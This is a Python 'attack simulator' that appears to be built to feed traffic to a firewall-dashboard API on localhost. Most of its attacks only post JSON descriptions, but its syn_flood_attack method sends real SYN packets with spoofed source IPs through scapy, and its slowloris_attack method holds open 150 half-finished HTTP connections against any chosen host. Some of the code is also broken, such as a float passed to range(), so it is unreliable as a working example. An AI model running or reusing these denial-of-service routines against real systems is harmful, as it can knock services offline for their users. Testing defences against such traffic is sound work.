import random
import time
import socket
import threading
import requests
from scapy.all import *
from datetime import datetime
import json

class AttackSimulator:
    def __init__(self, target_ip='127.0.0.1', target_port=5000):
        self.target_ip = target_ip
        self.target_port = target_port
        self.running = False
        self.api_url = f'http://{target_ip}:{target_port}/api/analyze'
        
    def send_attack_data(self, packet_data):
        """Send attack data to the firewall dashboard"""
        try:
            response = requests.post(
                self.api_url,
                json=packet_data,
                headers={'Content-Type': 'application/json'},
                timeout=2
            )
            result = response.json()
            if result.get('threat_level', 0) > 0.7:
                print(f"[!] Attack detected and blocked: {result.get('message')}")
            return result
        except Exception as e:
            print(f"[-] Error sending attack data: {e}")
            return None
        
    def send_request(self, path='/'):
        """Send a normal HTTP request to the target"""
        try:
            response = requests.get(f'http://{self.target_ip}:{self.target_port}{path}', timeout=2)
            print(f"[+] Normal request to {path} - Status: {response.status_code}")
        except Exception as e:
            print(f"[-] Error sending request: {e}")
    
    def syn_flood_attack(self, duration=10):
        """Simulate a SYN flood attack"""
        print(f"[!] Starting SYN flood attack on {self.target_ip}:{self.target_port} for {duration} seconds...")
        self.running = True
        
        def flood():
            while self.running:
                src_port = random.randint(1024, 65535)
                src_ip = f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}"
                
                # Create IP and TCP headers
                ip_header = IP(src=src_ip, dst=self.target_ip)
                tcp_header = TCP(sport=src_port, dport=self.target_port, flags="S", seq=random.randint(1000, 9000))
                
                # Send the packet
                send(ip_header/tcp_header, verbose=0)
        
        # Start multiple threads for the attack
        threads = []
        for _ in range(5):  # 5 threads for more intensity
            t = threading.Thread(target=flood)
            t.daemon = True
            threads.append(t)
            t.start()
        
        # Let the attack run for specified duration
        time.sleep(duration)
        self.running = False
        
        # Wait for threads to finish
        for t in threads:
            t.join()
            
        print("[!] SYN flood attack completed")
    
    def port_scan(self, intensity=1.0):
        """Simulate a port scan attack"""
        print(f"[!] Starting port scan on {self.target_ip}")
        
        def scan_port(port):
            try:
                # Create scan packet data
                packet_data = {
                    'timestamp': datetime.now().isoformat(),
                    'src_ip': f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}",
                    'dst_ip': self.target_ip,
                    'src_port': random.randint(1024, 65535),
                    'dst_port': port,
                    'protocol': 'tcp',
                    'flags': 'S',  # SYN flag for port scanning
                    'packet_size': 40,  # Typical SYN packet size
                    'attack_type': 'port_scan'
                }
                
                # Send the scan data to the firewall
                result = self.send_attack_data(packet_data)
                if result and result.get('threat_level', 0) > 0.7:
                    print(f"[!] Port scan detected on port {port}")
                
            except Exception as e:
                print(f"[!] Error scanning port {port}: {e}")
        
        # Scan ports using multiple threads
        threads = []
        for port in range(1, 1024):
            if not self.running:
                break
                
            t = threading.Thread(target=scan_port, args=(port,))
            t.daemon = True
            threads.append(t)
            t.start()
            
            # Limit number of concurrent threads
            if len(threads) >= 20 * intensity:
                for t in threads:
                    t.join()
                threads = []
            
            time.sleep(0.1 / intensity)  # Small delay between port scans
        
        # Wait for remaining threads to finish
        for t in threads:
            t.join()
            
        print("[!] Port scan completed")

    def http_flood(self, duration=10, intensity=1.0):
        """Simulate an HTTP flood attack"""
        print(f"[!] Starting HTTP flood on {self.target_ip}:{self.target_port} for {duration} seconds...")
        self.running = True
        
        def flood():
            while self.running:
                try:
                    # Create attack packet data
                    packet_data = {
                        'timestamp': datetime.now().isoformat(),
                        'src_ip': f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}",
                        'dst_ip': self.target_ip,
                        'src_port': random.randint(1024, 65535),
                        'dst_port': self.target_port,
                        'protocol': 'http',
                        'method': 'GET',
                        'path': f'/?id={random.randint(1, 10000)}',
                        'packet_size': random.randint(500, 1500),
                        'attack_type': 'http_flood',
                        'user_agent': f'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AttackBot/{random.randint(1, 100)}'
                    }
                    
                    # Send the attack data to the firewall
                    self.send_attack_data(packet_data)
                    print("[✓] HTTP flood packet sent")
                    time.sleep(0.1 / intensity)  # Small delay between requests
                    
                except Exception as e:
                    print(f"[!] Error in flood: {e}")
        
        # Start multiple threads for the attack
        threads = []
        for _ in range(5 * intensity):  # 5 concurrent threads
            t = threading.Thread(target=flood)
            t.daemon = True
            threads.append(t)
            t.start()
        
        # Let the attack run for specified duration
        time.sleep(duration)
        self.running = False
        
        # Wait for threads to finish
        for t in threads:
            t.join()
            
        print("[!] HTTP flood attack completed")

    def slowloris_attack(self, duration=30):
        """Simulate a Slowloris attack"""
        print(f"[!] Starting Slowloris attack on {self.target_ip}:{self.target_port} for {duration} seconds...")
        self.running = True
        
        def create_slowloris_connection():
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(4)
                s.connect((self.target_ip, self.target_port))
                
                # Send incomplete HTTP request
                s.send(f"GET /?{random.randint(0, 2000)} HTTP/1.1\r\n".encode())
                s.send(f"Host: {self.target_ip}\r\n".encode())
                s.send(b"User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.503l3;")
                
                # Keep the connection open by sending headers slowly
                while self.running:
                    try:
                        s.send(f"X-a: {random.randint(1, 5000)}\r\n".encode())
                        time.sleep(15)  # Send a header every 15 seconds
                    except:
                        break
                
                s.close()
            except Exception as e:
                pass
        
        # Start multiple connections
        threads = []
        for _ in range(150):  # Try to create 150 connections
            try:
                t = threading.Thread(target=create_slowloris_connection)
                t.daemon = True
                threads.append(t)
                t.start()
                time.sleep(0.2)  # Slight delay between connection attempts
            except:
                pass
        
        # Let the attack run for specified duration
        time.sleep(duration)
        self.running = False
        
        # Wait for threads to finish
        for t in threads:
            t.join()
            
        print("[!] Slowloris attack completed")

    def start_continuous_attack(self, attack_type, duration=60):
        """Run attack continuously with varying intensity"""
        self.running = True
        print(f"[!] Starting continuous {attack_type} attack on {self.target_ip}:{self.target_port}")
        
        def attack_loop():
            while self.running:
                try:
                    # Vary attack intensity
                    intensity = random.uniform(0.5, 2.0)  # Random intensity between 50% and 200%
                    
                    if attack_type == 'http':
                        self.http_flood(duration=5, intensity=intensity)
                    elif attack_type == 'portscan':
                        self.port_scan(intensity=intensity)
                    elif attack_type == 'all':
                        # Rotate through different attack types
                        attack = random.choice(['http', 'portscan'])
                        if attack == 'http':
                            self.http_flood(duration=5, intensity=intensity)
                        else:
                            self.port_scan(intensity=intensity)
                    
                    # Random delay between attack waves
                    time.sleep(random.uniform(1, 5))
                    
                except Exception as e:
                    print(f"[!] Error in attack loop: {e}")
                    time.sleep(5)  # Wait before retrying
        
        # Start attack in a separate thread
        self.attack_thread = threading.Thread(target=attack_loop, daemon=True)
        self.attack_thread.start()
        
        # Keep the main thread alive
        try:
            while self.running and duration > 0:
                time.sleep(1)
                duration -= 1
                print(f"\r[!] Attack in progress - {duration}s remaining", end="")
        except KeyboardInterrupt:
            print("\n[!] Stopping attack...")
        finally:
            self.stop_attack()
    
    def stop_attack(self):
        """Stop the continuous attack"""
        self.running = False
        if hasattr(self, 'attack_thread'):
            self.attack_thread.join(timeout=2)
        print("\n[!] Attack stopped")

if __name__ == "__main__":
    import argparse
    
    parser = argparse.ArgumentParser(description='Network Attack Simulator')
    parser.add_argument('--target', '-t', default='127.0.0.1', help='Target IP address')
    parser.add_argument('--port', '-p', type=int, default=5000, help='Target port')
    parser.add_argument('--attack', '-a', required=True, 
                       choices=['http', 'portscan', 'all'],
                       help='Type of attack to perform')
    parser.add_argument('--duration', '-d', type=int, default=60, 
                       help='Duration of the attack in seconds (0 for unlimited)')
    parser.add_argument('--continuous', '-c', action='store_true',
                       help='Run attack continuously with varying intensity')
    
    args = parser.parse_args()
    
    simulator = AttackSimulator(target_ip=args.target, target_port=args.port)
    
    try:
        # Test connection first
        print(f"[+] Testing connection to {args.target}:{args.port}")
        test_data = {
            'timestamp': datetime.now().isoformat(),
            'src_ip': '192.168.1.100',
            'dst_ip': args.target,
            'src_port': 54321,
            'dst_port': args.port,
            'protocol': 'tcp',
            'packet_size': 64,
            'message': 'Test connection'
        }
        response = requests.post(
            f'http://{args.target}:{args.port}/api/analyze',
            json=test_data,
            timeout=2
        )
        print(f"[+] Connection test successful (Status: {response.status_code})")
        
        # Run the attack
        if args.continuous:
            print("[!] Starting continuous attack (press Ctrl+C to stop)")
            simulator.start_continuous_attack(args.attack, args.duration if args.duration > 0 else 3600)
        else:
            if args.attack == 'http' or args.attack == 'all':
                simulator.http_flood(duration=args.duration)
            if args.attack == 'portscan' or args.attack == 'all':
                simulator.port_scan()
                
    except KeyboardInterrupt:
        print("\n[!] Attack stopped by user")
    except Exception as e:
        print(f"\n[!] Error: {e}")
    finally:
        simulator.stop_attack()
    
    print("\n[!] Attack simulation complete. Check your firewall dashboard for detection results.")
    print("    Note: Some attacks may be automatically blocked by your OS firewall.")
